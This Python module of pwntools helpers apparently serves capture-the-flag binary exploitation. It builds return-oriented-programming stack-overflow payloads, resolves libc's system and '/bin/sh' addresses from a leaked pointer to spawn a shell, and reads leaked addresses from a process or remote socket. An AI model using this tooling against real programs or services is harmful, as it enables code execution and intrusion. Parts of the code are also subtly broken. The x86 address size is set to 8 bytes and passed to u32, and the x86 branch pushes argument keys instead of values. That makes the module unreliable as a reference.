from typing import Union

from LibcSearcher import LibcSearcher
from pwn import *

import getpass

X86_64_REG_ARGUMENTS = 6
X86_64_ADDR_SIZE     = 6
X86_ADDR_SIZE        = 8

def create_rop_payload(buf_len, args: dict, arch: str, return_address: int,
                       canary=0x0, fake_return_addrress=0x0, padding_char=b'a',
                       padding_frame_pointer=b'a',
                       should_pad_fp=True) -> bytearray:
  '''
  Constructs a simple payload byte array for return-oriented programming.
  The payload can be used to overflow the stack.
  
  :param int buf_len: The length of the input buffer.
  :param dict args: The dictionary of the arguments needed to be passed to the
                    target function. If the architecture is x86_64, then the
                    value of each key should be the address of the pop_xxx
                    gadget.
  :param str arch: The architecture of the target binary.
  :param int return_address: The address that ret points to.
  :param int canary: The canary, if any.
  :param uint fake_return_address: The address of the instruction after the
                                   target function returns.
  :param byte padding_char: The padding byte of the buffer to be overflowen.
  :param byte padding_frame_pointer: The padding byte for the content of 
                                     RBP / EBP.
  :param bool should_pad_fp: Do we need to pad for frame pointer?
  :return: The construct payload byte string. 
  '''

  payload = padding_char * buf_len

  # Overflow the EBP / RBP based on the architecture.
  arch_lower = arch.lower()
  if arch_lower in ['i386', 'x86']:
    print('[+] Constructing payload for x86 platform...')
    is_x86 = True
  elif arch_lower in ['amd64', 'x64', 'x86_64']:
    print('[+] Constructing payload for x86_64 platform...')
    is_x86 = False

  else:
    raise Exception('Unknown architecture string!')

  # Add canary
  if canary != 0x0:
    payload += p64(canary) if not is_x86 else p32(canary)

  # Pad frame pointer.
  if should_pad_fp:
    payload += padding_frame_pointer * 0x8 if not is_x86 else \
               padding_frame_pointer * 0x4

  # X64's arguments are passed by registers, then by stack.
  if not is_x86:
    num = 0
    for k, v in args.items():
      # Only up to 6 registers can be used to pass arguments.
      if num >= 6:
        break

      if v is None or k == 0x0:
        raise Exception('The architecture is x86_64 but no corresponding rop \
                         gadget address is found!')
      else:
        payload += p64(k)
        for val in v:
          if num < 6:
            payload += p64(val)
            num += 1

  # Add the fake return address.
  payload += p64(return_address) if not is_x86 else p32(return_address)
  payload += p64(fake_return_addrress) if not is_x86 else \
             p32(fake_return_addrress)

  if is_x86:
    for k in args.keys():
      payload += p32(k)
  # Deal with remaining arguments for x86_64, if any.
  else:
    leftover_args = dict(list(args.items())[X86_64_REG_ARGUMENTS:])
    for k in leftover_args.keys():
      payload += p64(k)

  return payload


def get_shell_from_libc(func_str: str, func_addr: int) -> list:
  '''
  Given the memory address of the function and its offeset, finds the libc version and 
  outputs shell / system's address.

  :param func_str: The name of the target function.
  :param func_addr: The leaked address of the target function.
  :return: A list containing system and shell's addresses.
  '''

  libc = LibcSearcher(func_str, func_addr)
  libc_base = func_addr - libc.dump(func_str)
  system = libc_base + libc.dump('system')
  shell = libc_base + libc.dump('str_bin_sh')
  
  return [system, shell]

def get_shell_from_libc_so(func_str: str, func_addr: int, 
                           libc_path: str)-> list:
  '''
  Given the memory address of the function and its offeset, finds the libc version and outputs shell / system's address. Sometimes LibcSearcher cannot work very well with i386 libc.so.6, so we use local ones to calcualte offsets.

  :param func_str: The name of the target function.
  :param func_addr: The leaked address of the target function.
  :parem libc_path: The path of libc elf.

  :return: A list containing system and shell's addresses.
  '''

  libc = ELF(libc_path)
  libc_base = func_addr - libc.sym[func_str]
  system = libc_base + libc.sym['system']
  shell = libc_base + next(libc.search(b'/bin/sh'))
  
  return [system, shell]

def leak_address(io: Union[remote, process], arch, token='') -> int:
  '''
  Given an IO object and the token for splitting, extract the leaked address.

  :param [remote | process] io: The handle to the IO object.
  :param str arch: The target architecture.
  :param token: The spitting token.
  '''
  
  if not io.connected():
    raise Exception('The io object is not connected!')
  
  io.recvuntil(token)
  ans = u32(io.recv(X86_ADDR_SIZE)) if arch in ['x86', 'i386'] else \
        u64(io.recv(X86_64_ADDR_SIZE).ljust(0x8, b'\x00'))

  return ans

def get_libc_root(sub_version: str, arch='i386') -> str:
  '''
  Get the path to a given libc.so
  
  :param sub_version: the version of the libc.
  :param arch: the target architecture.
  '''
  user = getpass.getuser()
  
  return '/home/' + user + '/glibc-all-in-one/' + \
         sub_version + '-' + arch + '/libc.so.6'